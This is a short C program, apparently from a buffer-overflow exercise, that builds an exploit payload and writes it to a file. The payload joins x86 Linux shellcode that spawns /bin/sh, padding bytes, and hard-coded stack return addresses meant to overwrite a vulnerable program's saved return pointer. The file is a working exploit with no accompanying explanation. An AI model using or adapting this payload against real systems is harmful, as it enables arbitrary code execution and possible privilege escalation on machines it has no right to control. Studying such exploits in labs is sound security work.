#include <string.h>
#include <stdio.h>

static char shellcode[] = ""
"\xeb\x1f\x5e\x89\x76\x08\x31\xc0\x88\x46\x07\x89\x46\x0c\xb0\x0b"
"\x89\xf3\x8d\x4e\x08\x8d\x56\x0c\xcd\x80\x31\xdb\x89\xd8\x40\xcd"
"\x80\xe8\xdc\xff\xff\xff/bin/sh";//45

void main() {
	char* buffer;
	int i;

	buffer = malloc(269);
	strcpy(buffer, shellcode);
	for (i = 45; i < 260; i++) {
		buffer[i] = '\x42';
	}
	buffer[260] = '\x60';
	buffer[261] = '\xf8';
	buffer[262] = '\xff';
	buffer[263] = '\xbf';

	buffer[264] = '\x34';
	buffer[265] = '\xf7';
	buffer[266] = '\xff';
	buffer[267] = '\xbf';

	buffer[268] = '\x00';
	

	FILE* f;

	f = fopen("shellcode", "w");
	fputs(buffer, f);
	fclose(f);
}